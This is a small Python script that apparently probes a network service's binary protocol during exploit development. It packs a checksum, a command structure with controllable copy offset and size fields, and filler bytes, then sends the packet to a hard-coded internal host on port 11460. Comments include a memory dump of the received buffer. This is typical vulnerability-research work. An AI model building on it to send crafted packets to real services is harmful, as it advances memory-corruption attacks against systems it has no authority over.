import socket
import sys
from struct import pack


# 0x00       : Checksum DWORD
# 0x04 - 0x30: psAgentCommand
#   - 0x04 - 0x10:  ??
#   - 0x14:         Offset for copy operation
#   - 0x18:         Size of copy operation
#   - 0x1C - 0x30:  ??
# 0x34 - End:  psCommandBuffer

checksum_dword 	= pack(">i", 0x64)		# 0x00
unkown 		= bytearray([0x41]*0xC)		# 0x04 - 0x14
copy_offset 	= pack(">i", 0x10)		# 0x14
sz_copy 	= pack(">i", 0x20)		# 0x18
unkown_two 	= bytearray([0x41]*0x18)	# 0x1c - 0x34

psAgentCommand  = checksum_dword + unkown + copy_offset + sz_copy + unkown_two
psCommandBuffer = bytearray([0x42]*0x34)
buf 		= psAgentCommand + psCommandBuffer

buf = pack(">i", 0x64)		# checksum DWORD
buf += bytearray([0x41]*0x30)	# psAgentCommand
buf += bytearray([0x42]*0x34)	# bytearray([0x42]*0x34)

# psCommandBuffer (??)
# 5dac850   00000030 00001000 41414141 00002000
# 05dac860  41414141 41414141 41414141 06ea3c08
# 05dac870  f6fc07d7 081dc722 4c435846 534d5f49
# 05dac880  00005147 00000000 00000000 00000000
# 05dac890  00000000 00000000 00000000 00000000
# 05dac8a0  00000000 00000000 00000000 00000000
# 05dac8b0  00000000 00000000 00000000 00000000
# 05dac8c0  00000000 00000000 00000000 00000000

def main():
	server = "192.168.186.10" # sys.argv[1]
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)

if __name__ == "__main__":
 	main()
